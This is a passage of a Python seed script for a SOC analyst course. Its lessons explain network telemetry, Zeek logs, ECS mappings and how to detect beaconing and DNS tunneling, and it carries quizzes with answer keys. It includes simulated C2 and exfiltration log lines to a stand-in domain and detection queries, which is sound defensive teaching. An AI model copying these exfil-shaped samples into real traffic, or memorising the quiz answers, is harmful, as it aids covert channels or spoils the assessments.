> 2. Explain why sampling rate is essential context for any flow-based count
> 3. Identify the major Zeek log families and what each captures
> 4. Position proxy and next-generation firewall logs in the telemetry stack
> 5. Pick the right tier of telemetry for a given investigative question
>
> **Prerequisites.** Module 3 *Windows Event Logs* completed.

## Why this module exists

Module 3 covered endpoint logs — what happens *on* a host. This module covers what happens *between* hosts. Attackers don't always leave clean endpoint traces; a living-off-the-land tool can produce normal-looking process events while its *network* behaviour — a slow regular callback to an external IP every ten minutes — is the only place the compromise is visible.

Network telemetry also scopes incidents. When an alert fires on one host, network logs tell you whether other hosts also talked to the bad destination, whether data left the perimeter, and over what time window. Scoping is an L1 job and you cannot scope without flow and DNS history.

Finally, network logs are durable in a way endpoint logs are not. An attacker who clears Windows Security logs (4624 / 1102, covered in Module 3) cannot retroactively unsend the packets a network sensor captured.

## The three tiers of network telemetry

Network monitoring data trades fidelity for volume.

**Full packet capture (PCAP)** is the byte-for-byte recording of traffic. Highest fidelity; you can replay, extract files, decode protocols you didn't know about at capture time. Also enormous: a single saturated 1 Gb/s link produces around 450 GB per hour. Most organisations retain full PCAP only at chokepoints for hours to days.

**Flow records** are statistical summaries of conversations — typically a 5-tuple (source IP, source port, destination IP, destination port, protocol) plus byte and packet counts and timestamps. No payload. Tiny — ~50–100 bytes per record. Excellent for *"did host A ever talk to host B?"* over months. Poor for *"what did they say?"*.

**Protocol metadata logs** — the Zeek family — sit between PCAP and flow. The sensor parses the protocol on the wire (DNS, HTTP, TLS, SMB) and emits structured records of what was seen: the DNS query name, the HTTP host header, the TLS server name, file hashes for transferred files. Vastly smaller than PCAP, vastly richer than flow. **This tier is the L1 analyst's bread and butter.**

**IDS alerts** (Suricata, Snort) sit alongside Zeek, not in place of it. Zeek produces the fact-trail; the IDS produces a *"this fact-trail contains a known-bad pattern"* pointer.

| Property | PCAP | Flow (NetFlow/IPFIX) | Zeek metadata | IDS alerts |
| --- | --- | --- | --- | --- |
| Captures payload | Yes | No | Partial (extracted fields, hashes) | Only matching context |
| Storage cost | Very high | Very low | Low–moderate | Very low |
| Typical retention | Hours–days | Months–years | Weeks–months | Months |
| Good for retrospective hunt | If retained | Yes | Yes | Only if a rule fired |
| Good for *"did X ever talk to Y?"* | Slow | Excellent | Excellent | Only if rule fired |
| Privacy footprint | Highest | Lowest | Medium | Medium |

```mermaid
graph TD
    A[Network traffic] --> B[Full PCAP]
    A --> C[Flow records]
    A --> D[Protocol metadata]
    A --> E[IDS alerts]
    C --> C1[NetFlow v5]
    C --> C2[NetFlow v9 / IPFIX]
    C --> C3[sFlow]
    D --> D1[Zeek conn.log]
    D --> D2[Zeek dns.log]
    D --> D3[Zeek http.log]
    D --> D4[Zeek ssl.log]
    D --> D5[Zeek files.log]
    E --> E1[Suricata]
    E --> E2[Snort]
```

## NetFlow, IPFIX, and sFlow

**NetFlow** was developed by Cisco. v5 is the legacy workhorse — fixed fields, IPv4-only. v9 added templates for extensibility and IPv6. NetFlow is unidirectional by default; a TCP connection produces two records, one per direction, and most collectors stitch them.

**IPFIX (IP Flow Information Export)** is the IETF-standard successor to NetFlow v9, defined in RFC 7011. Template-based, vendor-neutral, supports application identification when the exporter inspects deep enough.

**sFlow (sampled flow)** is fundamentally different. NetFlow/IPFIX try to record every flow by default. sFlow is *always sampled* — the exporter looks at, say, 1 in every 1024 packets, and exports those samples plus periodic interface counters. Cheap on switch ASICs, which is why high-density switches favour it. **You must remember the sampling rate when reasoning about volumes** — a single observed flow at 1:1024 implies roughly a thousand unseen real flows.

Every flow architecture has the same three parts: an **exporter** (router, switch, firewall, dedicated probe), a **collector** (the central system that ingests and stores), and an **analyser** (the SIEM or hunt UI you actually query). Sampling can be enabled even on NetFlow exporters under load — *always know your sampling rate before you call something rare.*

What flows do **not** capture: no payload. No DNS query name. No HTTP URL. No TLS server name. No file transferred. They tell you *"192.0.2.45 sent 14 MB to 198.51.100.12 over TCP/443 between 02:14 and 02:18"* — they do not tell you whether that 443 connection was Gmail, Slack, or a Cobalt Strike beacon.

## Zeek (formerly Bro)

Zeek is a network security monitor that parses traffic in real time and emits structured logs by protocol. It is not a signature-matching IDS; it is a programmable protocol decoder that produces a fact-trail. The Zeek log family an L1 should recognise:

- **conn.log** — every connection attempt, successful or not. The backbone log.
- **dns.log** — every DNS query and response.
- **http.log** — every cleartext HTTP transaction (host, URI, method, status, user-agent, referrer).
- **ssl.log** — every TLS handshake (SNI, certificate chain ID, JA3 fingerprint).
- **files.log** — every file Zeek extracted from a protocol stream, with hash.
- **x509.log** — every certificate seen, with subject, issuer, validity dates.
- **smtp.log / ftp.log / ssh.log** — protocol-specific envelopes and version exchanges.
- **weird.log** — protocol-violation events (often noise, sometimes real).
- **notice.log** — Zeek's curated *"you should look at this"* output.

Zeek differs from raw PCAP in that the parsing is already done. *"Did anyone resolve `evil-c2.example`?"* against PCAP needs you to decode every DNS packet in the timeframe; against Zeek it's a single field match on `dns.log`. Against NetFlow it's not answerable at all — flow records don't carry DNS query names.

## Suricata and Snort

Signature-based IDS. They watch traffic against a ruleset (Emerging Threats, Talos, custom) and emit alerts on match. For L1 work, IDS alerts are usually the *trigger* for an investigation, and Zeek/flow data is what you use to scope and confirm. A Suricata `ET MALWARE Cobalt Strike Beacon Activity` on host A is the starting gun; the conn.log shows how long the pattern has been going on, the dns.log shows what name resolved to that destination, the ssl.log carries the JA3.

Treat IDS alerts with healthy scepticism — false-positive rates on community rules are non-trivial. The default L1 question is not *"is this real?"* but *"given this alert, what does Zeek/flow show, and does that corroborate?"*.

## Proxy and firewall logs

Most enterprise networks force outbound HTTP/HTTPS through a forward proxy or NGFW.

- **Web proxies (Zscaler, Bluecoat, Squid)** log per-URL: timestamp, user, source IP, destination URL, host, method, content-category, action (allow/block), bytes, user-agent. Best place to answer *"did this user visit this site?"* with HTTP/HTTPS, especially with SSL inspection enabled.
- **Next-generation firewalls (Palo Alto, Fortinet, Check Point)** produce traffic logs (5-tuple plus app-id and bytes), URL filtering logs, threat logs, decryption logs. Palo Alto's `App-ID` is *"regardless of port, this looks like SSH"* or *"this looks like Tor"*.
- **Perimeter firewalls without app-awareness** (older Cisco ASA, basic iptables) produce 5-tuple connection logs equivalent to NetFlow.

What an L1 sees: usually a SIEM-normalised view that flattens proxy and firewall logs into a common schema (often ECS — covered next lesson). The fields you care about are source identity, destination, action, category, bytes.

## Trade-offs

- **Cost vs fidelity.** PCAP is highest fidelity, highest cost. Flow is lowest cost, lowest fidelity. Zeek is the practical sweet spot.
- **Retention vs volume.** Six months of flow data costs less than two days of PCAP at a busy site.
- **Privacy.** PCAP captures everything including credentials and personal data inside cleartext protocols. Many organisations restrict PCAP queries. Zeek can be configured to drop sensitive fields. Flow has the smallest privacy footprint.
- **Encryption.** Modern TLS 1.3 with Encrypted Client Hello (ECH) limits what unencrypted-decoder Zeek can see — SNI may be hidden. JA3 still works on the handshake. PCAP without keys is opaque past the handshake.

```mermaid
graph TD
    P[PCAP - highest detail, highest volume]
    Z[Zeek metadata - mid detail, mid volume]
    F[Flow records - low detail, lowest volume]
    P --> Z
    Z --> F
```

## Glossary

- **PCAP** — Packet Capture; lossless byte-for-byte recording. Highest fidelity, highest cost.
- **NetFlow** — Cisco-originated flow-record protocol. v5 IPv4-only legacy; v9 templates + IPv6.
- **IPFIX** — IETF standard flow protocol (RFC 7011), successor to NetFlow v9.
- **sFlow** — Always-sampled flow protocol favoured by high-density switches.
- **Sampling rate** — Ratio of inspected to total packets/flows; required context for flow counts.
- **Exporter / collector / analyser** — Device emits records → central store → query tool.
- **Zeek** — Open-source network monitor (formerly Bro); programmable, not signature-based.
- **Suricata / Snort** — Signature-based IDS engines.
- **App-ID** — Palo Alto's enriched protocol identifier independent of port.

## Further reading

- Zeek log reference: https://docs.zeek.org/en/master/script-reference/log-files.html
- RFC 7011 — IPFIX Protocol Specification: https://www.rfc-editor.org/rfc/rfc7011
- RFC 3954 — NetFlow v9: https://www.rfc-editor.org/rfc/rfc3954
- RFC 3176 — sFlow: https://www.rfc-editor.org/rfc/rfc3176
""",
    )
    m4l1q = _add_lesson(
        session, mod4, order=2, title="Data sources — quiz",
        lesson_type=LessonType.QUIZ, duration_min=6,
        content_md="Three questions on telemetry tier selection, sFlow behaviour, and Zeek's role.",
    )
    _add_q(session, m4l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which network telemetry tier is best suited to answering *\"did any host in the estate ever connect to 198.51.100.42 in the last 90 days?\"*",
        options=[
            {"value": "pcap", "label": "Full PCAP"},
            {"value": "flow", "label": "NetFlow / IPFIX records"},
            {"value": "ids_only", "label": "Suricata alerts only"},
            {"value": "edr", "label": "Endpoint EDR logs"},
        ],
        correct="flow",
        explanation_md="Flow records are designed for long retention and per-conversation queries. PCAP is rarely retained 90 days; Suricata only fires on rule matches; EDR doesn't index full network history.",
        points=2,
    )
    _add_q(session, m4l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are true about sFlow?",
        options=[
            {"value": "sampled", "label": "It is always sampled"},
            {"value": "payload", "label": "It captures full packet payloads"},
            {"value": "asic", "label": "Used by high-density switches because it's cheap on the ASIC"},
            {"value": "rate_context", "label": "Sampling rate must be considered when reasoning about volume"},
        ],
        correct=["sampled", "asic", "rate_context"],
        explanation_md="sFlow is statistically sampled, doesn't capture payloads, is favoured on busy switching gear, and the sampling rate is essential context when interpreting counts.",
        points=2,
    )
    _add_q(session, m4l1q, order=3, kind=QuestionKind.TRUEFALSE,
        stem_md="Zeek is fundamentally a signature-based IDS, like Snort.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="false",
        explanation_md="**False.** Zeek is a programmable network monitor that parses protocols and emits structured logs. Suricata and Snort are signature-based. Zeek scripts can produce notices but the core engine is a protocol decoder, not a rule matcher.",
        points=1,
    )

    # Lesson 4.2 — Zeek + ECS mapping
    m4l2 = _add_lesson(
        session, mod4, order=3,
        title="Reading Zeek logs and the ECS mapping",
        lesson_type=LessonType.READING, duration_min=22,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Read a `conn.log` row and explain every field
> 2. Interpret the seven `conn_state` codes that matter for triage
> 3. Identify suspicious patterns in `dns.log` and `ssl.log`
> 4. Pivot between Zeek logs using the shared `uid`
> 5. Map every Zeek field to its Elastic Common Schema (ECS) equivalent
> 6. Write a basic KQL query against Zeek-via-Filebeat data

## conn.log fields

A `conn.log` record represents one connection (or attempt). The fields you must know:

- **ts** — connection-start timestamp.
- **uid** — *connection unique ID*, e.g. `CzZRSm4VC4P0E5VqTk`. Every other Zeek log produced for this connection (dns, http, ssl, files) shares this uid. **It is the pivot key.**
- **id.orig_h / id.orig_p** — originator IP and port (the side that initiated).
- **id.resp_h / id.resp_p** — responder IP and port.
- **proto** — transport protocol (`tcp`, `udp`, `icmp`).
- **service** — application protocol Zeek identified (`dns`, `http`, `ssl`, `ssh`, `smb`). Empty if Zeek couldn't identify it.
- **duration** — connection duration in seconds.
- **orig_bytes / resp_bytes** — application-layer bytes sent by each side (excludes retransmissions/headers).
- **conn_state** — the connection state code (next section).
- **history** — compact packet-sequence string. Lowercase = originator, uppercase = responder. `S`=SYN, `H`=SYN+ACK, `A`=ACK, `D`=data, `F`=FIN, `R`=RST. A successful TLS connection looks like `ShADdaFf`.

Example row (TSV, abbreviated):

```
ts=1714060800.123 uid=CzZRSm4VC4P0E5VqTk id.orig_h=10.20.30.40 id.orig_p=51234
id.resp_h=192.0.2.55 id.resp_p=443 proto=tcp service=ssl duration=14.21
orig_bytes=4502 resp_bytes=88210 conn_state=SF history=ShADadFf
```

Read it as: client `10.20.30.40` made an outbound TLS connection to `192.0.2.55:443`, lasted 14.2s, client sent 4.5 KB, received 88 KB, terminated cleanly.

## conn_state codes that matter

| Code | Meaning | Triage signal |
| --- | --- | --- |
| **S0** | SYN sent, no reply | Port-scan or dead destination |
| **S1** | Established, not terminated at flush | In-progress; usually unremarkable |
| **SF** | Normal establishment + termination | Healthy traffic — also healthy beacons |
| **REJ** | Responder rejected with RST | Closed port, or filtered |
| **RSTO** | Originator aborted with RST | Application-layer abort |
| **RSTR** | Responder aborted with RST | Server actively cut client off — investigate |
| **OTH** | No SYN seen, mid-connection only | Long-lived connection present at sensor start |

**Triage shortcuts:** thousands of `S0` to many destinations in a short window = scanning. Many `REJ` to one destination = misconfigured client. `SF` outbound with 1 KB out + 50 KB in = normal HTTP. `SF` outbound with 50 MB out + 2 KB in = exfil candidate.

## dns.log — patterns to flag

Key fields: `uid`, `id.orig_h`, `id.resp_h`, `query`, `qtype_name` (A, AAAA, TXT, MX), `rcode_name` (NOERROR, NXDOMAIN, SERVFAIL, REFUSED), `answers`, `TTLs`.

- **Long subdomain labels.** A query for `aGVsbG8tdGhpcy1pcy1leGZpbA.evil.example` with 50+ chars before the parent is a classic DNS-tunneling shape. CDN domains can have long labels too — context and parent reputation matter.
- **NXDOMAIN bursts.** A host generating dozens of NXDOMAIN replies in a short window often means a Domain Generation Algorithm (DGA) is at work; the malware burns through algorithmic candidates until it finds the live controller.
- **DGA-shaped queries.** High-entropy strings like `xkqzplmnvwert.com`, `qjxzbvwert42.net`. The labels look statistically random rather than English words.
- **Rare TLDs.** Heavy traffic to `.tk`, `.top`, `.xyz`, `.cf`, `.gq` correlates with abuse — use as a weight, not a verdict.
- **TXT-record volume.** TXT is normal for SPF/DKIM/domain-validation. *Thousands of TXT queries from one host to one parent domain over hours* is the hallmark of `dnscat2` / `iodine`-style tunneling.

## http.log and ssl.log

`http.log` covers cleartext HTTP — fields you'll use: `host`, `uri`, `method`, `status_code`, `user_agent`, `referrer`, `request_body_len`, `response_body_len`. With most traffic now TLS-encrypted, http.log is mostly relevant where SSL inspection decrypts on the wire, or for legitimate cleartext (internal HTTP, captive portals).

`ssl.log` is far more useful in TLS-everywhere networks. Fields: `version`, `cipher`, `server_name` (the SNI), `subject`, `issuer`, `validation_status`, `ja3`, `ja3s`, `established`.

**SNI (Server Name Indication)** is the unencrypted hostname in the TLS ClientHello. Until Encrypted Client Hello (ECH) deploys broadly, SNI is the analyst's window into *what site did this client claim to be visiting?* Note **claim** — domain fronting can lie; ECH will eliminate SNI visibility entirely on networks that adopt it.

**JA3 / JA3S in non-jargon terms.** JA3 is a fingerprint of how a TLS client speaks during the handshake — its list of cipher suites, extensions, elliptic curves, and curve formats. Different software stacks (Chrome, Firefox, Python `requests`, Cobalt Strike, Sliver) produce subtly different lists. JA3 hashes the lists into a 32-character MD5. Two clients with identical JA3s are probably running the same TLS library version. JA3S is the same idea on the server side. Why this matters for L1: even though the rest of the connection is encrypted, **a host producing a JA3 that matches a known Cobalt Strike beacon's JA3 is strong evidence of what's running, without ever decrypting the payload.** JA3 collisions are real (legitimate Java clients overlap with malware that uses the same TLS library), so use it as a strong weight, not a verdict.

## Pivoting via uid

The most powerful pivot in the Zeek stack. Every connection produces one `conn.log` row and zero or more rows in protocol-specific logs, all sharing the same `uid`.

1. Find the `conn.log` row of interest.
2. Take the `uid`.
3. Query every other Zeek log for that uid. You instantly get DNS resolution, TLS SNI/JA3, and any files transferred.

If the original alert is a Suricata signature, Suricata in eve.json mode emits a `flow_id` that maps to Zeek's connection key in most properly-integrated stacks.

```mermaid
graph LR
    C[conn.log uid=ABC123]
    D[dns.log uid=XYZ789]
    H[http.log uid=ABC123]
    S[ssl.log uid=ABC123]
    F[files.log uid=ABC123]
    X[x509.log fingerprint=...]
    C --- H
    C --- S
    C --- F
    S --- X
    D -. resolves to .-> C
```

The dashed arrow is the conceptual link from a DNS resolution (its own uid) to the resulting connection (different uid but matching destination IP).

## ECS field mapping

Modern ELK stacks ingest Zeek via Filebeat's Zeek module, which renames fields into the Elastic Common Schema (ECS). You'll see both names in practice — Zeek-native in some panels, ECS in others. The mapping you must memorise:

| Zeek field | ECS field |
| --- | --- |
| `id.orig_h` | `source.ip` |
| `id.orig_p` | `source.port` |
| `id.resp_h` | `destination.ip` |
| `id.resp_p` | `destination.port` |
| `proto` | `network.transport` |
| `service` | `network.protocol` |
| `orig_bytes` | `source.bytes` |
| `resp_bytes` | `destination.bytes` |
| `orig_bytes + resp_bytes` | `network.bytes` |
| `query` (dns.log) | `dns.question.name` |
| `qtype_name` (dns.log) | `dns.question.type` |
| `rcode_name` (dns.log) | `dns.response_code` |
| `host` (http.log) | `url.domain` |
| `uri` (http.log) | `url.path` |
| `user_agent` (http.log) | `user_agent.original` |
| `server_name` (ssl.log) | `tls.client.server_name` |
| `ja3` (ssl.log) | `tls.client.ja3` |
| `ja3s` (ssl.log) | `tls.server.ja3s` |

ECS uses dotted lowercase paths and prefers `source` / `destination` over `client` / `server` for connection-level data.

## Worked KQL examples

**Example 1 — rare destination ports for one host.** A user's workstation feels sluggish; you want any unusual outbound TCP destinations in 24h.

```kql
event.dataset : "zeek.conn"
and source.ip : "10.20.30.40"
and not destination.port : (80 or 443 or 53 or 123)
and network.transport : "tcp"
```

In Discover sort by `@timestamp` descending; in Lens aggregate by `destination.port` to spot any port that's unexpectedly common.

**Example 2 — long-subdomain DNS candidates.** Surface DNS-tunneling candidates across the estate.

```kql
event.dataset : "zeek.dns"
and dns.question.name : *
and dns.question.type : ("TXT" or "A")
```

Then in Lens aggregate by `dns.question.name`, top values, and add a runtime field `dns_label_length` from the leftmost label's character count. Anything above 50 chars with significant query volume warrants a closer look.

## Glossary

- **conn.log / uid** — Zeek connection record + connection-unique pivot key.
- **conn_state** — Two/three-character state code: S0, S1, SF, REJ, RSTO, RSTR, OTH.
- **history** — Per-packet-direction shorthand string in conn.log.
- **SNI** — Server Name Indication; unencrypted TLS hostname extension.
- **JA3 / JA3S** — TLS handshake fingerprint hashes (client / server).
- **DGA / NXDOMAIN** — Algorithmic-domain malware behaviour signal.
- **ECS** — Elastic Common Schema; normalised field naming for the SIEM.

## Further reading

- ECS network fields: https://www.elastic.co/guide/en/ecs/current/ecs-network.html
- ECS DNS fields: https://www.elastic.co/guide/en/ecs/current/ecs-dns.html
- ECS TLS fields: https://www.elastic.co/guide/en/ecs/current/ecs-tls.html
- JA3 (Salesforce original): https://github.com/salesforce/ja3
""",
    )
    m4l2q = _add_lesson(
        session, mod4, order=4, title="Zeek + ECS — quiz",
        lesson_type=LessonType.QUIZ, duration_min=6,
        content_md="Three questions on conn_state interpretation, ECS mapping, and the uid pivot.",
    )
    _add_q(session, m4l2q, order=1, kind=QuestionKind.SINGLE,
        stem_md="A host produced 4,000 conn.log records in 60 seconds, all with `conn_state=S0`, to many different destinations. What's the most likely explanation?",
        options=[
            {"value": "browse", "label": "Heavy legitimate web browsing"},
            {"value": "syn_scan", "label": "A TCP SYN port scan from this host"},
            {"value": "ssh", "label": "A long-lived SSH session"},
            {"value": "inbound", "label": "The host received many inbound connections"},
        ],
        correct="syn_scan",
        explanation_md="`S0` means SYN sent with no reply, and 4,000 such attempts to varied destinations in a minute is a textbook SYN-scan fingerprint.",
        points=2,
    )
    _add_q(session, m4l2q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which Zeek-to-ECS field mappings are correct?",
        options=[
            {"value": "src_ip", "label": "id.orig_h → source.ip"},
            {"value": "query", "label": "query (dns.log) → dns.question.name"},
            {"value": "sni_url", "label": "server_name (ssl.log) → url.domain"},
            {"value": "ja3", "label": "ja3 (ssl.log) → tls.client.ja3"},
        ],
        correct=["src_ip", "query", "ja3"],
        explanation_md="The SNI maps to `tls.client.server_name`, not `url.domain` (which is the HTTP host). The other three are correct.",
        points=3,
    )
    _add_q(session, m4l2q, order=3, kind=QuestionKind.SINGLE,
        stem_md="You have a suspicious conn.log row with `uid=CzZRSm4VC4P0E5VqTk`. What's the fastest way to retrieve every related Zeek event for this connection?",
        options=[
            {"value": "ip_time", "label": "Search every Zeek log for the source IP and timestamp"},
            {"value": "uid", "label": "Query every Zeek log dataset filtering on that uid"},
            {"value": "pcap", "label": "Replay the PCAP for that timeframe"},
            {"value": "suricata", "label": "Open a Suricata rule against the destination"},
        ],
        correct="uid",
        explanation_md="`uid` is the connection-level pivot key shared across all Zeek logs for that connection. Filtering on uid is exact and instant.",
        points=2,
    )

    # Lesson 4.3 — beaconing & C2
    m4l3 = _add_lesson(
        session, mod4, order=5,
        title="Beaconing, DNS tunneling, and C2 detection",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Define beaconing and identify its statistical signature in Zeek conn.log
> 2. Walk a worked example end-to-end (144 connections, ~600 s jitter, low byte volume)
> 3. Recognise DNS-tunneling shape and write the KQL aggregation that surfaces it
> 4. Identify HTTP/HTTPS C2 indicators despite encryption
> 5. Reason about CDN-hidden C2 (Cloudfront, Discord CDN) without false-positiving on legitimate cloud traffic
> 6. State the L1 escalation criteria for a suspected C2

## What beaconing is

A beacon is a periodic check-in by an implanted agent to its command-and-control (C2) server. The agent says *"I'm alive — any orders?"*; the server says *"yes, run this"* or *"no, sleep"*. Cadence varies — 60 s, 5 min, 1 hour. Mature C2 frameworks (Cobalt Strike, Sliver, Mythic, Brute Ratel) randomise with **jitter** — a percentage variation around the base — so check-ins cluster around an average rather than landing on the second.

Beaconing is hard to spot manually because each individual connection is unremarkable: a small TCP/443 from a workstation to an external IP, tens of kilobytes, completes cleanly. **The signal lives in the aggregate** — hundreds of nearly-identical connections, regularly spaced, over hours.

## The statistical signature

The shape an L1 should learn to recognise:

- **High connection count** to a single destination over a long window. *"144 connections to 192.0.2.55 in the last 24 hours"* is suspicious if the destination isn't a known service.
- **Low total byte volume per connection.** A beacon's check-in is small — a few hundred bytes to a few KB. If the C2 has work, the answer can be larger; otherwise both directions are tiny.
- **Regular interval with jitter.** Plot timestamps; look for clustering around a base period. Common: 30 s, 60 s, 300 s, 600 s, 3600 s. Jitter typically 0–30 %.
- **Long-lived destination.** Same destination contacted across hours or days, not a one-off burst.
- **Single source-destination pair.** Beaconing is usually one infected host to one C2 IP, not many sources to one destination.

**Mental rule.** A host that talks to one external IP **at least once every ten minutes for six hours straight**, with each connection under 10 KB total, is beaconing until proven otherwise. The proof is usually *"that destination is a legitimate service"* (Microsoft update endpoints, telemetry, mail polling).

## Worked example — 144 connections in 24 hours

A daily summary shows workstation `10.20.30.40` had exactly 144 successful TCP/443 connections to `192.0.2.55` over the last 24 hours, average 3.2 KB out / 2.8 KB in. 144 / 24 h = **once every ten minutes**, with low volume both ways.

Sample conn.log shape (abbreviated):

```
ts=...T00:00:14Z src=10.20.30.40:55001 dst=192.0.2.55:443 proto=tcp service=ssl
  duration=4.1 orig_bytes=3211 resp_bytes=2855 conn_state=SF
ts=...T00:10:32Z src=10.20.30.40:55012 dst=192.0.2.55:443 proto=tcp service=ssl
  duration=4.0 orig_bytes=3198 resp_bytes=2844 conn_state=SF
ts=...T00:20:51Z src=10.20.30.40:55021 dst=192.0.2.55:443 proto=tcp service=ssl
  duration=4.2 orig_bytes=3205 resp_bytes=2861 conn_state=SF
ts=...T00:31:08Z src=10.20.30.40:55029 dst=192.0.2.55:443 proto=tcp service=ssl
  duration=3.9 orig_bytes=3220 resp_bytes=2849 conn_state=SF
[... 140 more ...]
```

Inter-arrival times: 618 s, 619 s, 617 s — base **600 s with ~3 % jitter**. Byte counts uniform. **All `conn_state=SF`** — clean handshake, clean close. Classic beacon.

The ES|QL aggregation that surfaces this estate-wide:

```esql
FROM zeek-conn-*
| WHERE event.dataset == "zeek.conn"
   AND network.transport == "tcp"
   AND destination.ip IS NOT NULL
   AND NOT CIDR_MATCH(destination.ip, "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")
| STATS conn_count = COUNT(*),
        avg_bytes = AVG(network.bytes),
        unique_src = COUNT_DISTINCT(source.ip)
   BY source.ip, destination.ip, destination.port
| WHERE conn_count >= 50 AND avg_bytes < 20000 AND unique_src == 1
| SORT conn_count DESC
```

Returns source-destination pairs with ≥50 connections, average size <20 KB, single source per destination — the candidate beacon list. Walk the list, check SNI and JA3 in `ssl.log` for those connections, and look up the destination IP against threat intel.

```mermaid
sequenceDiagram
    participant A as Implant 10.20.30.40
    participant C as C2 192.0.2.55
    A->>C: TLS connect, 3.2KB out, 2.8KB in (T+0)
    Note over A,C: ~600s sleep with jitter
    A->>C: TLS connect, 3.1KB out, 2.9KB in (T+618s)
    Note over A,C: ~600s sleep with jitter
    A->>C: TLS connect, 3.2KB out, 2.8KB in (T+1235s)
    Note over A,C: pattern continues 144x in 24h
```

## DNS tunneling

DNS tunneling encodes data in DNS queries and responses. DNS is rarely blocked — even on networks that aggressively filter web traffic — so malware uses it as a covert channel for both C2 and exfiltration. Tools: `dnscat2`, `iodine`, DNS modes in Cobalt Strike.

The shape:

- High query volume from one source to one parent domain.
- Long subdomain labels (often 50+ chars) carrying base32/base64-encoded payload chunks.
- Frequent use of TXT records (the spec allows ~255 bytes of arbitrary text in a TXT response — useful for the C2 to send commands back).
- Sometimes A or AAAA records for short payloads, with the answer IP encoding the response.

**Worked example.** Internal host `10.20.30.40` is making DNS queries to `c2.example.test` (`.test` is reserved by RFC 6761 for examples). dns.log shows:

```
ts=... query=aGVsbG8tdGhpcy1pcy1jaHVuay0xLW9mLWV4ZmlsLWRhdGE.c2.example.test
       qtype=TXT rcode=NOERROR
ts=... query=Y2h1bmstMi1tb3JlLWRhdGEtaGVyZS1jb250aW51aW5n.c2.example.test
       qtype=TXT rcode=NOERROR
ts=... query=Y2h1bmstMy1ldmVuLW1vcmUtZGF0YS1iZWluZy1zZW50.c2.example.test
       qtype=TXT rcode=NOERROR
[... 800 more in a 5-minute window ...]
```

Each leftmost label ~45–50 chars of base32-shaped content. All TXT type. All to the same parent. Query rate ~3/s — far above any user behaviour.

```kql
event.dataset : "zeek.dns"
and dns.question.type : "TXT"
and source.ip : *
```

Aggregate in Lens by `source.ip` and `dns.question.registered_domain` (when ECS module is configured). Sort by query count; compute mean leftmost-label length — anything over 30 chars is unusual.

```mermaid
graph LR
    H[Internal host 10.20.30.40]
    R[Internal resolver]
    A[Authoritative for c2.example.test]
    H -- "TXT q: aGVsbG8...c2.example.test" --> R
    R -- "recursive lookup" --> A
    A -- "TXT response with command bytes" --> R
    R -- "answer back" --> H
```

## HTTP/HTTPS C2

Before TLS dominated, HTTP-based C2 was the norm; it's still common in commodity malware. Shape:

- **Low-and-slow GET/POST.** Periodic requests to one URL, small bodies.
- **Suspicious user agents.** `Mozilla/4.0 (compatible; MSIE 6.0)` in 2026, `Python-urllib/3.9` from a workstation that shouldn't run scripts, or unique strings. Some C2 mimics realistic UAs perfectly — UA alone is a weak signal.
- **No Referer.** A browser navigation almost always carries a Referer; a script-driven beacon usually doesn't.
- **Odd content-types.** A POST body marked `application/octet-stream` from a workstation to an unfamiliar domain is more suspicious than `application/json`.
- **Repeating URI patterns.** Long random-looking paths, embedded base64, repeated requests to identical paths.

For HTTPS, the same principles apply but you only see the encrypted shell — connection counts, byte volumes, SNI (when present), JA3, server certificate.

## Domain fronting and CDN-hidden C2

**Domain fronting** put one (innocuous) hostname in the SNI and another (malicious) hostname in the encrypted Host header, exploiting CDNs that routed by Host. Major CDNs (Google, AWS CloudFront, Azure Front Door) have largely closed it, but the descendant pattern persists: malware hosting C2 endpoints on legitimate cloud or CDN infrastructure so the traffic looks like normal cloud traffic.

What you'll see at L1: SNIs of `cloudfront.net`, `azureedge.net`, `cloudflare.com`, `cdn.discordapp.com`, `s3.amazonaws.com`. None are *automatically* bad. But:

- A host beaconing to the same Cloudflare IP every ten minutes for six hours is suspicious **regardless** of the SNI.
- A workstation that has no business hitting Discord CDN suddenly making periodic requests there is suspicious.
- Destination IP + JA3 + interval matters more than SNI alone.

Don't dismiss a beacon pattern because the SNI looks legit. **The shape is the signal.**

## JA3 against known-bad lists

Public and commercial lists ship JA3 hashes associated with specific malware. Indexing them as a SIEM enrichment turns a haystack into a small candidate set. Caveat: **JA3 collisions are real** — older Cobalt Strike default JA3 overlapped with common Java client JA3s. Always corroborate JA3 hits with destination, interval, and conn count.

## Escalation criteria

Escalate to L2 when any of the following are met (**two or more** for a strong case):

- **Beacon pattern confirmed** — high-count, low-byte, regular-interval connections from one internal host to one external destination, conn_state SF, over multiple hours.
- **Bad JA3 match** with corroborating shape (same host, regular interval).
- **DNS tunneling** — high TXT query rate, long subdomains, single source.
- **Known-bad destination IP or domain** that the host actually connected to.
- **Cleartext HTTP C2 indicators** — repeating requests, hardcoded suspicious UA, no Referer.

Write up: source host, destination(s), time window, connection count, average bytes, JA3 (if SSL), supporting query.

## Glossary

- **Beacon / jitter** — Periodic C2 check-in with randomised interval offset.
- **DGA** — Domain Generation Algorithm; algorithmically generated rendezvous candidates.
- **DNS tunneling** — Covert channel encoding payload in DNS queries/responses.
- **Domain fronting** — Mismatched SNI vs encrypted Host abusing CDN routing.
- **JA3** — TLS client handshake fingerprint hash; identifies stack despite encryption.

## Further reading

- MITRE ATT&CK T1071 Application Layer Protocol: https://attack.mitre.org/techniques/T1071/
- MITRE ATT&CK T1071.004 DNS: https://attack.mitre.org/techniques/T1071/004/
- MITRE ATT&CK T1572 Protocol Tunneling: https://attack.mitre.org/techniques/T1572/
""",
    )
    m4l3q = _add_lesson(
        session, mod4, order=6, title="Beaconing & C2 — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the beaconing signature, DNS tunneling, CDN-hidden C2, and conn_state for a successful beacon.",
    )
    _add_q(session, m4l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Which of these is the strongest *individual* signal of beaconing?",
        options=[
            {"value": "single", "label": "A single TCP/443 connection to an unfamiliar IP"},
            {"value": "regular", "label": "Many TCP/443 connections, regularly spaced, low byte volume, from one source to one destination over hours"},
            {"value": "burst", "label": "A burst of a thousand connections to a thousand different destinations in 60 seconds"},
